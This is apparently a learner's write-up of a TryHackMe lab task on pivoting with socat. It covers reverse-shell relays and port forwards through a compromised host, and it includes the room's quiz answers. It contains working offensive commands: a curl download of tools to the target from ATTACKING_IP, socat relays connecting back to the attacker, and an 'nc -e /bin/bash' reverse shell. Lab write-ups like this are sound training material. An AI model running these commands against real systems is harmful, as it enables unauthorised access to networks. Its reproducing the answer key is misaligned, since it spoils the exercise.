Socat is not just great for fully stable Linux shells[[1]](https://tryhackme.com/room/introtoshells), it's also superb for port forwarding. The one big disadvantage of socat (aside from the frequent problems people have learning the syntax), is that it is very rarely installed by default on a target. That said, static binaries are easy to find for both [Linux](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat) and [Windows](https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download). Bear in mind that the Windows version is unlikely to bypass Antivirus software by default, so custom compilation may be required. Before we begin, it's worth noting: if you have completed the [What the Shell?](https://tryhackme.com/room/introtoshells) room, you will know that socat can be used to create encrypted connections. The techniques shown here could be combined with the encryption options detailed in the shells room to create encrypted port forwards and relays. To avoid overly complicating this section, this technique will not be taught here; however, it's well worth experimenting with this in your own time.  

Whilst the following techniques could not be used to set up a full proxy into a target network, it is quite possible to use them to successfully forward ports from both Linux and Windows compromised targets. In particular, socat makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the target and then forwards it immediately back to the attacking box:

![Diagram demonstrating the purpose of a relay to forward a shell back from a target PC](https://assets.tryhackme.com/additional/wreath-network/502e2fa5765e.png)  

It's best to think of socat as a way to join two things together -- kind of like the Portal Gun in the Portal games, it creates a link between two different locations. This could be two ports on the same machine, it could be to create a relay between two different machines, it could be to create a connection between a port and a file on the listening machine, or many other similar things. It is an extremely powerful tool, which is well worth looking into in your own time.

Generally speaking, however, hackers tend to use it to either create reverse/bind shells, or, as in the example above, create a port forward. Specifically, in the above example we're creating a port forward _from_ a port on the compromised server _to_ a listening port on our own box. We could do this the other way though, by either forwarding a connection from the attacking machine to a target inside the network, or creating a direct link between a listening port on the _attacking machine_ with the service on the internal server. This latter application is especially useful as it does not require opening a port on the compromised server.

Before using socat, it will usually be necessary to download a binary for it, then upload it to the box.

**For example, with a Python webserver:-**

On Kali (inside the directory containing your Socat binary):

`sudo python3 -m http.server 80`

Then, on the target:  
`curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME`

![Demonstration of using cURL with a Python HTTP server to upload files](https://assets.tryhackme.com/additional/wreath-network/f976be91162d.png)

With the binary uploaded, let's have a look at each of the above scenarios in turn.

_**Note:** This uploads the socat binary with your username in the title; however, the example commands given in the rest of this task will refer to the binary simply as_ `socat`_._  

---

**Reverse Shell Relay**

In this scenario we are using socat to create a relay for us to send a reverse shell back to our own attacking machine (as in the diagram above). First let's start a standard netcat listener on our attacking box (`sudo nc -lvnp 443`). Next, on the compromised server, use the following command to start the relay:  
`./socat tcp-l:8000 tcp:ATTACKING_IP:443 &   `

_**Note:** the order of the two addresses matters here. Make sure to open the listening port first,_ then _connect back to the attacking machine._  

From here we can then create a reverse shell to the newly opened port 8000 on the compromised server. This is demonstrated in the following screenshot, using netcat on the remote server to simulate receiving a reverse shell from the target server:

![Demonstration of a socat reverse shell relay from the compromised target to the attacking machine using netcat to simulate sending a shell](https://assets.tryhackme.com/additional/wreath-network/e8740afb79ab.png)

A brief explanation of the above command:

- `tcp-l:8000` is used to create the first half of the connection -- an IPv4 listener on tcp port 8000 of the target machine.
- `tcp:ATTACKING_IP:443` connects back to our local IP on port 443. The ATTACKING_IP obviously needs to be filled in correctly for this to work.
- `&` backgrounds the listener, turning it into a job so that we can still use the shell to execute other commands.

The relay connects back to a listener started using an alias to a standard netcat listener: `sudo nc -lvnp 443`.  

In this way we can set up a relay to send reverse shells through a compromised system, back to our own attacking machine. This technique can also be chained quite easily; however, in many cases it may be easier to just upload a static copy of netcat to receive your reverse shell directly on the compromised server.

---

**Port Forwarding -- Easy**

![](https://assets.tryhackme.com/additional/wreath-network/YzM2ZWVlOGU5.png)The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server. For example, if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:  
`./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &   `

This opens up port 33060 on the compromised server and redirects the input from the attacking machine straight to the intended target server, essentially giving us access to the (presumably MySQL Database) running on our target of 172.16.0.10. The `fork` option is used to put every connection into a new process, and the `reuseaddr` option means that the port stays open after a connection is made to it. Combined, they allow us to use the same port forward for more than one connection. Once again we use `&` to background the shell, allowing us to keep using the same terminal session on the compromised server for other things.

We can now connect to port 33060 on the relay (172.16.0.5) and have our connection directly relayed to our intended target of 172.16.0.10:3306.

---

**Port Forwarding -- Quiet**

The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning. Whilst the risk is not _massive_, it pays to know a slightly quieter method of port forwarding with socat. This method is marginally more complex, but doesn't require opening up a port externally on the compromised server.

First of all, on our own attacking machine, we issue the following command:  
`socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &`

This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the `fork` and `reuseaddr` options set, to allow us to create more than one connection using this port forward.

Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:  
`./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &   `

This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:  
`./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &   `

This would create a link between port 8000 on our attacking machine, and port 80 on the intended target (172.16.0.10), meaning that we could go to `localhost:8000` in our attacking machine's web browser to load the webpage served by the target: 172.16.0.10:80!

This is quite a complex scenario to visualise, so let's quickly run through what happens when you try to access the webpage in your browser:

![](https://assets.tryhackme.com/additional/wreath-network/ZjA0YmEzMzVl.png)

- The request goes to `127.0.0.1:8000`
- Due to the socat listener we started on our own machine, anything that goes into port 8000, comes out of port 8001
- Port 8001 is connected directly to the socat process we ran on the compromised server, meaning that anything coming out of port 8001 gets sent to the compromised server, where it gets relayed to port 80 on the target server.

The process is then reversed when the target sends the response:

- The response is sent to the socat process on the compromised server. What goes into the process comes out at the other side, which happens to link straight to port 8001 on our attacking machine.
- Anything that goes into port 8001 on our attacking machine comes out of port 8000 on our attacking machine, which is where the web browser expects to receive its response, thus the page is received and rendered.

We have now achieved the same thing as previously, but without opening any ports on the server!  

---

Finally, we've learnt how to _create_ backgrounded socat port forwards and relays, but it's important to also know how to _close_ these. The solution is simple: run the `jobs` command in your terminal, then kill any socat processes using `kill %NUMBER`:

![Demonstration for how to kill background jobs](https://assets.tryhackme.com/additional/wreath-network/61ca87aa4350.png)  

---

**For the following questions, assume that we are working with a local copy of socat called `socat` in the current directory.**  

---

[[1] TryHackme: What The Shell?](https://tryhackme.com/room/introtoshells)  

Answer the questions below

1. Which socat option allows you to reuse the same listening port for more than one connection?  

**`reuseaddr`**

2. If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?

**`./socat tcp-l:8000 tcp:172.16.0.200:443`**

Use TCP port 8000 for the server listener, and **do not** background the process.  


3. What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?  

**`./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &`**

4. **Bonus Question (Optional):** Try to create an encrypted port forward or relay using the `OPENSSL` options in socat. Task 7 of the [shells](https://tryhackme.com/room/introtoshells) room may help with this.

**Listening on a port using SSL and printing to STDOUT**

```php
socat OPENSSL-LISTEN:4433,reuseaddr,cert=./cert.pem,cafile=./ca.cert.pem,key=./key.pem,verify=0 STDOUT
```

---

**Useful Commands**

**Reverse Shell Relay**

On Kali (inside the directory containing your Socat binary) start http server:
```php
sudo python3 -m http.server 80
```

Retrieve file:
```php
curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME
```

Start a standard netcat listener:
```php
nc -lvnp 443
```

On the compromised server, use the following command to start the relay:
```php
./socat tcp-l:8000 tcp:ATTACKING_IP:443 &
```

_**Note:** the order of the two addresses matters here. Make sure to open the listening port first,_ then _connect back to the attacking machine._ You will also need the nc-username binary for the next part (following tools instructions for naming). 

Create a reverse shell to the newly opened port 8000:
```php
./nc-<USERNAME> 127.0.0.1:8000 -e /bin/bash
```

- The listener i set up should now retrieve the connection.

---

A brief explanation of the above command:

- `tcp-l:8000` is used to create the first half of the connection -- an IPv4 listener on tcp port 8000 of the target machine.
- `tcp:ATTACKING_IP:443` connects back to our local IP on port 443. The ATTACKING_IP obviously needs to be filled in correctly for this to work.
- `&` backgrounds the listener, turning it into a job so that we can still use the shell to execute other commands.

The relay connects back to a listener started using an alias to a standard netcat listener: `sudo nc -lvnp 443`.

---

**Port Forwarding -- Easy**

- if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:
```php
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
```

- We can now connect to port 33060 on the relay (172.16.0.5) and have our connection directly relayed to our intended target of 172.16.0.10:3306.

**Port Forwarding -- Quiet**

First of all, on our own attacking machine, we issue the following command:
```php
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```

- This opens up two ports: 8000 and 8001, creating a local port relay

Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:
```php
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```

This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:
```php
./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &
```

**SSL**

```php
./socat OPENSSL-LISTEN:4433,reuseaddr,cert=./cert.pem,cafile=./ca.cert.pem,key=./key.pem,verify=0 STDOUT
```

**Motivation**: When working with secure connections, it may be necessary to create a listening socket that uses SSL/TLS encryption. This can be useful for implementing secure communication channels or testing SSL/TLS-enabled services.

**Explanation**: This command sets up a listening socket using the `OPENSSL-LISTEN` option, which enables SSL/TLS encryption for the connection. The port used for listening is specified with the `4433` argument.

The `reuseaddr` option allows the socket to reuse addresses to bind to, in case the port is already in use. The `cert`, `cafile`, and `key` arguments specify the paths to the server certificate, CA certificate, and private key to be used for the SSL/TLS connection.

The `verify=0` option disables certificate verification, which is useful for testing purposes or when using self-signed certificates.

The `STDOUT` option specifies that the received data should be printed to the console.

**Example Output**: Data received on the listening port will be printed to the console.

---

**Completed:** _08:26 2024-07-19_
**Author:** _z0d_
